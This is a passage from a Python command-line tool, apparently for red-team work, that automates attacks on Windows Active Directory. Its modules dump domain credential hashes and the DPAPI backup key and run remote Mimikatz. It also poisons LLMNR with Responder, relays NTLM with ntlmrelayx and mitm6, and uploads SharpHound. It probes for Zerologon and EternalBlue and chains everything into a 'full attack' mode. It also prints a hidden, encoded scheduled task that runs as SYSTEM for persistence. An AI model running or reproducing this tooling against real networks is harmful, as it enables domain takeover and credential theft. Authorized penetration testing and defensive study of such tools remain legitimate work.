  $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoP -W Hidden -Enc <b64>'
  $t = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5)
  Register-ScheduledTask -TaskName 'SystemHealth' -Action $a -Trigger $t -User 'SYSTEM'

{Y}Force GPO update:{RST}
  crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' -x 'gpupdate /force'
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: CREDENTIAL ACCESS
# ──────────────────────────────────────────────────────────────────────────────

class CredentialAccess:
    @staticmethod
    def secretsdump(target_user: str = ""):
        title("Secretsdump / DC Sync")
        if not config.has_creds():
            err("Credentials required")
            return
        script = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
        if not script:
            warn("secretsdump not found — skipping.")
            return
        out_dir = ensure_dir("secrets")
        cmd     = [script, f"{config.domain}/{config.username}:{config.password}@{config.ip}"]
        cmd    += (["-just-dc-user", target_user] if target_user else ["-just-dc-ntlm"])
        stdout  = run_s(cmd)
        fname   = f"hashes_{target_user or 'all'}.txt"
        (out_dir / fname).write_text(stdout)
        for line in stdout.splitlines():
            if "krbtgt" in line.lower():
                success(f"KRBTGT: {line}")
        info("Crack NTLM: hashcat -m 1000 hashes.txt rockyou.txt")

    @staticmethod
    def dpapi_backup():
        title("DPAPI Backup Key")
        if not config.has_creds():
            err("Credentials required")
            return
        script = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
        if not script:
            return
        out_dir = ensure_dir("dpapi")
        stdout  = run_s([script,
                         f"{config.domain}/{config.username}:{config.password}@{config.ip}",
                         "-backup-key"])
        (out_dir / "backup_key.txt").write_text(stdout)
        info("Decrypt blobs: dpapi.py masterkey -backupkey <KEY> /path/to/masterkey")

    @staticmethod
    def mimikatz_remote():
        title("Remote Mimikatz")
        if not config.has_creds():
            err("Credentials required")
            return
        print(f"""
{Y}Via CME module:{RST}
  crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' -M mimikatz

{Y}Via lsassy:{RST}
  crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' -M lsassy
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: RELAY ATTACKS
# ──────────────────────────────────────────────────────────────────────────────

class RelayAttacks:
    @staticmethod
    def responder(duration: int = 60):
        title(f"Responder — LLMNR Poisoning ({duration}s)")
        if not require_tool("responder"):
            return
        out_dir = ensure_dir("responder")
        ts      = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        out_file = out_dir / f"hashes_{ts}.txt"

        def _run():
            stdout, _ = run(["sudo", "timeout", str(duration),
                             "responder", "-I", config.interface, "-rdwv"],
                            timeout=duration + 15)
            out_file.write_text(stdout)

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        info(f"Responder running in background on {config.interface} ({duration}s)")
        info(f"Hashes → {out_file}")
        info("Crack NTLMv2: hashcat -m 5600 <file> rockyou.txt")

    @staticmethod
    def smb_relay(targets_file: str = "targets.txt"):
        title("SMB Relay")
        if not Path(targets_file).exists():
            err(f"Targets file not found: {targets_file}")
            return
        print(f"""
{Y}Terminal 1 – Responder (SMB/HTTP off):{RST}
  sudo sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
  sudo responder -I {config.interface} -rdwv

{Y}Terminal 2 – ntlmrelayx:{RST}
  sudo impacket-ntlmrelayx -tf {targets_file} -smb2support -i

{Y}IPv6 / mitm6:{RST}
  sudo mitm6 -d {config.domain}
  sudo impacket-ntlmrelayx -6 -t ldaps://{config.ip} -wh fakewpad.{config.domain}
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: BLOODHOUND
# ──────────────────────────────────────────────────────────────────────────────

class BloodHound:
    @staticmethod
    def collect(sharphound: str = "SharpHound.exe"):
        title("BloodHound — Data Collection")
        out_dir = ensure_dir("bloodhound")
        if Path(sharphound).exists() and config.has_creds():
            run(["crackmapexec", "smb", config.ip,
                 "-u", config.username, "-p", config.password,
                 "--put-file", sharphound, "Windows/Temp/SharpHound.exe"])
            run(["crackmapexec", "winrm", config.ip,
                 "-u", config.username, "-p", config.password,
                 "-X", "Windows\\Temp\\SharpHound.exe -c All"])
            run(["crackmapexec", "smb", config.ip,
                 "-u", config.username, "-p", config.password,
                 "--get-file", "Windows\\Temp\\*.zip", str(out_dir) + "/"])
            success(f"BloodHound data → {out_dir}")
        else:
            print(f"""
{Y}Manual collection:{RST}
  crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' --put-file SharpHound.exe Windows/Temp/
  crackmapexec winrm {config.ip} -u {config.username} -p '{config.password}' -X 'Windows\\Temp\\SharpHound.exe -c All'
  crackmapexec smb {config.ip} -u {config.username} -p '{config.password}' --get-file Windows\\Temp\\*.zip {out_dir}/
  neo4j console && bloodhound --no-sandbox
""")

# ──────────────────────────────────────────────────────────────────────────────
# MODULE: CVE SCANNER  — FIX: renamed loop var 'info' → 'vuln'
# ──────────────────────────────────────────────────────────────────────────────

class CVEScanner:
    VULNS = {
        "CVE-2020-1472": {"name": "Zerologon",      "port": 445,  "check": ["nmap", "--script", "smb-vuln-cve-2020-1472", "-p", "445", "{ip}"]},
        "CVE-2021-26855": {"name": "ProxyLogon",     "port": 443,  "check": ["curl", "-k", "-s", "-I", "https://{ip}/owa/", "--max-time", "5"]},
        "CVE-2021-34473": {"name": "ProxyShell",     "port": 443,  "check": ["curl", "-k", "-s", "-X", "OPTIONS", "https://{ip}/autodiscover/", "--max-time", "5"]},
        "CVE-2019-1040":  {"name": "PrivExchange",   "port": 443,  "check": ["nmap", "-p", "443", "--script", "http-ntlm-info", "{ip}"]},
        "MS17-010":       {"name": "EternalBlue",    "port": 445,  "check": ["nmap", "--script", "smb-vuln-ms17-010", "-p", "445", "{ip}"]},
        "CVE-2020-0618":  {"name": "SQL RCE",        "port": 1433, "check": ["nmap", "-p", "1433", "--script", "ms-sql-info", "{ip}"]},
    }

    @staticmethod
    def scan():
        title("CVE Scanner")
        out_dir = ensure_dir("cves")
        results = []

        for cve_id, vuln in CVEScanner.VULNS.items():      # FIX: was 'info' — now 'vuln'
            if not is_port_open(config.ip, vuln["port"]):
                debug(f"Port {vuln['port']} closed — skip {cve_id}")
                continue
            step(f"Checking {cve_id} ({vuln['name']}) …")
            cmd    = [tok.replace("{ip}", config.ip) for tok in vuln["check"]]
            stdout = run_s(cmd, timeout=30)
            if stdout and len(stdout) > 10:
                warn(f"  {cve_id} — POSSIBLE VULNERABILITY")
                results.append({"cve": cve_id, "name": vuln["name"], "details": stdout[:200]})
            else:
                info(f"  {cve_id} — not detected")

        (out_dir / "scan_results.json").write_text(json.dumps(results, indent=2))
        title("Vulnerability Summary")
        if results:
            for r in results:
                print(f"{R}[!]{RST} {r['cve']} — {r['name']}")
        else:
            success("No known vulnerabilities detected")
        return results

# ──────────────────────────────────────────────────────────────────────────────
# REPORT  — FIX: wired with calculate_file_hash for evidence integrity
# ──────────────────────────────────────────────────────────────────────────────

def generate_report():
    title("Generating Report")
    report_file = ensure_dir() / "REPORT.txt"
    services    = detect_services(config.ip) if config.ip else {}

    lines = [
        "ROT05 Assessment Report",
        "=" * 60,
        f"Target:    {config.ip}",
        f"Domain:    {config.domain}",
        f"Timestamp: {datetime.datetime.now()}",
        "=" * 60,
        "",
        "DETECTED SERVICES:",
        *[f"  • {k}" for k, v in services.items() if v],
        "",
        "FINDINGS:",
    ]

    findings = []
    for label, path in [
        ("Kerberoastable accounts", OUTPUT_DIR / "kerberoast" / "hashes.txt"),
        ("AS-REP roastable accounts", OUTPUT_DIR / "asrep"    / "hashes.txt"),
    ]:
        if path.exists() and path.stat().st_size > 0:
            findings.append(f"  • {label}")

    cpass = OUTPUT_DIR / "gpo" / "cpassword_results.txt"
    if cpass.exists() and "cpassword" in cpass.read_text().lower():
        findings.append("  • cPassword in SYSVOL")

    lines += findings if findings else ["  No critical findings yet"]

    # FIX: SHA256 integrity hashes wired into report
    lines += ["", "OUTPUT FILES (SHA256):"]
    for subdir in sorted(OUTPUT_DIR.iterdir()):
        if subdir.is_dir():
            lines.append(f"\n[{subdir.name.upper()}]")
            for f in sorted(subdir.iterdir()):
                if f.is_file():
                    sha = calculate_file_hash(f)
                    lines.append(f"  {f.name:<40s}  {sha}")

    lines += ["", "=" * 60]
    report_file.write_text("\n".join(lines))
    success(f"Report → {report_file}")

# ──────────────────────────────────────────────────────────────────────────────
# INTERACTIVE SHELL
# ──────────────────────────────────────────────────────────────────────────────

class ROT05Shell(cmd.Cmd):
    intro  = f"\n{Y}ROT05 Interactive Shell{RST} — type {G}help{RST} for commands\n"
    prompt = f"{B}ROT05>{RST} "

    def __init__(self):
        super().__init__()
        self.modules = {
            "nmap":         lambda: ADEnum.nmap(config.ip),
            "ldap":         ADEnum.ldap,
            "smb":          ADEnum.smb,
            "rpc":          ADEnum.rpc,
            "windapsearch": ADEnum.windapsearch,
            "kerberoast":   KerberosAttacks.kerberoast,
            "asreproast":   KerberosAttacks.asreproast,
            "golden":       KerberosAttacks.golden_ticket,
            "adcs":         ADCSAttacks.enumerate_ca,
            "exch-detect":  ExchangeAttacks.detect_version,
            "privexchange": ExchangeAttacks.privesc,
            "ews":          ExchangeAttacks.ews_abuse,
            "sql-enum":     SQLAttacks.enumerate,
            "sql-cmd":      lambda: SQLAttacks.xp_cmdshell(input("Command: ")),
            "gpo-scan":     GPOAttacks.find_cpassword,
            "gpo-pwn":      GPOAttacks.malicious_gpo,
            "secrets":      CredentialAccess.secretsdump,
            "dpapi":        CredentialAccess.dpapi_backup,
            "mimikatz":     CredentialAccess.mimikatz_remote,
            "responder":    lambda: RelayAttacks.responder(60),
            "relay":        lambda: RelayAttacks.smb_relay("targets.txt"),
            "bloodhound":   lambda: BloodHound.collect("SharpHound.exe"),
            "scan":         CVEScanner.scan,
        }

    def do_set(self, arg):
        """set target|domain|user|pass|hash|ca|exchange|sql|interface <value>"""
        parts = arg.split(maxsplit=1)
        if len(parts) != 2:
            print("Usage: set <option> <value>")
            return
        key, val = parts[0].lower(), parts[1]
        mapping  = {
            "target": "ip", "domain": "domain", "user": "username",
            "pass": "password", "hash": "ntlm_hash", "ca": "ca_server",
            "exchange": "exchange_server", "sql": "sql_server", "interface": "interface",
        }
        if key in mapping:
            setattr(config, mapping[key], val)
            success(f"{key} = {val if key != 'pass' else '***'}")
        else:
            err(f"Unknown option: {key}")

    def do_show(self, _):
        """Display current configuration"""
        print(f"\n{Y}Configuration:{RST}")
        for label, val in [
            ("Target",    config.ip),
            ("Domain",    config.domain),
            ("Username",  config.username),
            ("Password",  "*" * len(config.password) if config.password else ""),
            ("Hash",      config.ntlm_hash[:16] + "…" if config.ntlm_hash else ""),
            ("Interface", config.interface),
            ("Output",    str(config.output_dir)),
        ]:
            print(f"  {label:<12} {val or 'NOT SET'}")

    def do_enum(self, _):
        """Full enumeration (nmap, ldap, smb, rpc)"""
        if not config.ip:
            err("Target not set")
            return
        title("Full Enumeration")
        for svc, up in detect_services(config.ip).items():
            (success if up else debug)(f"{svc} {'detected' if up else 'not detected'}")
        # FIX: use ThreadPoolExecutor for parallel enumeration
        enum_tasks = [ADEnum.ldap, ADEnum.smb, ADEnum.rpc, ADEnum.windapsearch]
        with ThreadPoolExecutor(max_workers=4) as ex:
            futures = {ex.submit(t): t.__name__ for t in enum_tasks}
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as exc:
                    warn(f"{futures[fut]} failed: {exc}")
        ADEnum.nmap(config.ip)  # nmap runs sequentially (long, uses -oA)

    def do_full(self, _):
        """Complete attack chain"""
        if not config.ip or not config.has_creds():
            err("Target and credentials required")
            return
        self.do_enum("")
        KerberosAttacks.kerberoast()
        KerberosAttacks.asreproast()
        if config.ca_server or is_port_open(config.ip, 443):
            ADCSAttacks.enumerate_ca()
        if is_port_open(config.ip, 1433):
            SQLAttacks.enumerate()
        CredentialAccess.secretsdump()
        CredentialAccess.dpapi_backup()
        GPOAttacks.find_cpassword()
        success("Full chain complete")

    def do_run(self, arg):
        """run <module>"""
        if not arg:
            print(f"Modules: {', '.join(self.modules)}")
            return
        if arg not in self.modules:
            err(f"Unknown module: {arg}")
            return
        if not config.ip:
            err("Target not set")
            return
        try:
            self.modules[arg]()
        except Exception as exc:
            err(f"Module failed: {exc}")

    def do_report(self, _):
        """Generate report"""
        generate_report()

    def do_shell(self, arg):
        """shell <cmd>  — run system command"""
        if arg:
            stdout, _ = run(arg.split(), shell=False)
            print(stdout)
        else:
            os.system(os.environ.get("SHELL", "/bin/bash"))

    def do_exit(self, _):
        """Exit"""
        print("Goodbye!")
        return True

    def do_help(self, _):
        print(f"""
{Y}Commands:{RST}  set, show, enum, full, run <module>, report, shell <cmd>, exit

{Y}Modules:{RST}
  nmap ldap smb rpc windapsearch
  kerberoast asreproast golden
  adcs exch-detect privexchange ews
  sql-enum sql-cmd
  gpo-scan gpo-pwn
  secrets dpapi mimikatz
  responder relay bloodhound scan
""")

# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        description="ROT05 Swiss Army Knife — authorized use only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 red_offensive_team_05.py                                # interactive
  python3 red_offensive_team_05.py -t 10.10.10.10 --enum
  python3 red_offensive_team_05.py -t DC.htb.local -d htb.local -u user -P --kerberoast
  python3 red_offensive_team_05.py -t 10.10.10.10 -d lab.local -u admin -p Pass --full
  python3 red_offensive_team_05.py -t 10.10.10.10 --scan-cves
  python3 red_offensive_team_05.py -t 10.10.10.10 --enum --force-rerun
""")
    p.add_argument("-t", "--target")
    p.add_argument("-d", "--domain")
    p.add_argument("-u", "--username")
    p.add_argument("-p", "--password")
    p.add_argument("-P", "--prompt-password", action="store_true",
                   help="Prompt for password (keeps it out of shell history)")
    p.add_argument("-H", "--hash",           help="NTLM hash for PTH")
    p.add_argument("--enum",        action="store_true")
    p.add_argument("--full",        action="store_true")
    p.add_argument("--kerberoast",  action="store_true")
    p.add_argument("--asreproast",  action="store_true")
    p.add_argument("--golden",      action="store_true")
    p.add_argument("--silver",      metavar="SPN")
    p.add_argument("--adcs",        action="store_true")
    p.add_argument("--exchange",    action="store_true")
    p.add_argument("--sql",         action="store_true")
    p.add_argument("--secrets",     nargs="?", const="", metavar="USERNAME")
    p.add_argument("--dpapi",       action="store_true")
    p.add_argument("--responder",   type=int, nargs="?", const=60, metavar="SECONDS")
    p.add_argument("--scan-cves",   action="store_true")
    p.add_argument("--bloodhound",  metavar="SHARPHOUND_PATH")
    p.add_argument("--ca-server")
    p.add_argument("--exchange-server")
    p.add_argument("--sql-server")
    p.add_argument("--interface",   default="eth0")
    p.add_argument("-o", "--output", default="rot05_output")
    p.add_argument("--interactive",  action="store_true")
    # FIX: --force-rerun to bypass checkpoints
    p.add_argument("--force-rerun",  action="store_true",
                   help="Re-run phases even if already completed")
    # FIX: --check-window to enforce compliance time window
    p.add_argument("--check-window", action="store_true",
                   help="Enforce authorized hours window before running")
    p.add_argument("--window-start", type=int, default=8,  metavar="HOUR")
    p.add_argument("--window-end",   type=int, default=18, metavar="HOUR")
    # Recommendation 1: config file
    p.add_argument("--config",        metavar="PATH",
                   help="Load persistent settings from JSON config file")
    p.add_argument("--save-config",   action="store_true",
                   help="Save non-sensitive settings to config file then exit")
    # Recommendation 2: result encryption
    p.add_argument("--encrypt-results", action="store_true",
                   help="Encrypt sensitive output dirs after run completes")
    p.add_argument("--passphrase",    metavar="PHRASE",
                   help="Encryption passphrase (prefer --passphrase-file)")
    p.add_argument("--passphrase-file", metavar="FILE",
                   help="Read encryption passphrase from file")
    # Recommendation 3: dry-run
    p.add_argument("--dry-run",       action="store_true",
                   help="Print commands without executing them")
    return p.parse_args()


def _resolve_passphrase(args) -> str:
    """Return encryption passphrase from CLI arg, file, or interactive prompt."""
    if args.passphrase:
        return args.passphrase
    if args.passphrase_file:
        try:
            return Path(args.passphrase_file).read_text().strip()
        except Exception as exc:
            err(f"Cannot read passphrase file: {exc}")
            sys.exit(ExitCode.ENCRYPT_ERROR)
    return getpass("Encryption passphrase: ")


def main():
    args = parse_args()

    # ── Recommendation 3: activate dry-run before any run() call ────────────
    global DRY_RUN
    if args.dry_run:
        DRY_RUN = True
        warn("DRY-RUN mode active — commands will be printed, not executed")

    # ── Recommendation 1: load config file first; CLI args override below ───
    cfg_file: Optional[ConfigFile] = None
    if args.config:
        cfg_path = Path(args.config)
        if not cfg_path.exists():
            err(f"Config file not found: {cfg_path}")
            sys.exit(ExitCode.CONFIG_ERROR)
        cfg_file = ConfigFile(cfg_path)
        cfg_file.apply(config)

    # Populate config (CLI values override any file-loaded values)
    if args.target:          config.ip              = args.target
    if args.domain:          config.domain          = args.domain
    if args.username:        config.username        = args.username
    if args.password:        config.password        = args.password
    if args.hash:            config.ntlm_hash       = args.hash
    if args.ca_server:       config.ca_server       = args.ca_server
    if args.exchange_server: config.exchange_server = args.exchange_server
    if args.sql_server:      config.sql_server      = args.sql_server
    if args.interface:       config.interface       = args.interface
    if args.output:
        config.output_dir = Path(args.output)

    global OUTPUT_DIR
    OUTPUT_DIR = config.output_dir
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    # FIX: logging deferred until output_dir is known
    setup_logging(OUTPUT_DIR)

    # ── Recommendation 1: optionally save config then continue ──────────────
    if args.save_config:
        save_path = Path(args.config) if args.config else OUTPUT_DIR / "rot05_config.json"
        ConfigFile(save_path).save(config)

    if args.prompt_password and not config.password and config.username:
        config.password = getpass(f"Password for {config.username}@{config.domain}: ")

    main_banner()

    # ── Recommendation 6: proper exit codes for compliance failure ───────────
    if args.check_window:
        checker = ComplianceChecker(args.window_start, args.window_end)
        ok, msg = checker.check()
        if not ok:
            err(f"Compliance check failed: {msg}")
            err("Adjust --window-start/--window-end to override.")
            sys.exit(ExitCode.COMPLIANCE_FAIL)
        success(f"Compliance: {msg}")

    if args.interactive or not args.target:
        ROT05Shell().cmdloop()
        return

    info(f"Target:  {config.ip}")
    info(f"Domain:  {config.domain or '(not set)'}")
    info(f"Output:  {OUTPUT_DIR}")

    ckpt  = CheckpointManager(OUTPUT_DIR)
    force = args.force_rerun

    ComplianceChecker.flag_intrusive(
        [k for k, v in vars(args).items() if v is True or (v and k not in
         ("target","domain","username","password","hash","output","interface"))]
    )

    if args.scan_cves:
        _phase("cves", CVEScanner.scan, ckpt, force)

    if args.enum or args.full:
        _phase("nmap",         lambda: ADEnum.nmap(config.ip), ckpt, force)
        # parallel enumeration
        tasks = [ADEnum.ldap, ADEnum.smb, ADEnum.rpc, ADEnum.windapsearch]
        with ThreadPoolExecutor(max_workers=4) as ex:
            futs = {ex.submit(lambda fn=t: _phase(fn.__name__, fn, ckpt, force)): t for t in tasks}
            for fut in as_completed(futs):
                try:
                    fut.result()
                except Exception as exc:
                    warn(f"Enumeration task failed: {exc}")

    if args.kerberoast or args.full:
        _phase("kerberoast",  KerberosAttacks.kerberoast,  ckpt, force)
    if args.asreproast or args.full:
        _phase("asreproast",  KerberosAttacks.asreproast,  ckpt, force)
    if args.golden or args.full:
        _phase("golden",      KerberosAttacks.golden_ticket, ckpt, force)
    if args.silver:
        _phase("silver",      lambda: KerberosAttacks.silver_ticket(args.silver), ckpt, force)
    if args.adcs or args.full:
        _phase("adcs",        ADCSAttacks.enumerate_ca,    ckpt, force)
    if args.exchange or args.full:
        _phase("exchange",    ExchangeAttacks.detect_version, ckpt, force)
    if args.sql or args.full:
        _phase("sql",         SQLAttacks.enumerate,         ckpt, force)
    if args.secrets is not None or args.full:
        user = args.secrets if args.secrets else ""
        _phase("secrets",     lambda: CredentialAccess.secretsdump(user), ckpt, force)
    if args.dpapi or args.full:
        _phase("dpapi",       CredentialAccess.dpapi_backup, ckpt, force)
    if args.responder:
        _phase("responder",   lambda: RelayAttacks.responder(args.responder), ckpt, force)
    if args.bloodhound:
        _phase("bloodhound",  lambda: BloodHound.collect(args.bloodhound), ckpt, force)

    generate_report()

    # ── Recommendation 2: encrypt sensitive results ──────────────────────────
    if args.encrypt_results:
        passphrase = _resolve_passphrase(args)
        ResultEncryptor(passphrase, OUTPUT_DIR).encrypt_sensitive(OUTPUT_DIR)

    success(f"Done — results in {OUTPUT_DIR}")
    sys.exit(ExitCode.SUCCESS)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted{RST}")
        sys.exit(0)
    except Exception as exc:
        err(f"Fatal: {exc}")
        logger.critical("Unhandled exception", exc_info=True)
        sys.exit(ExitCode.GENERAL_ERROR)
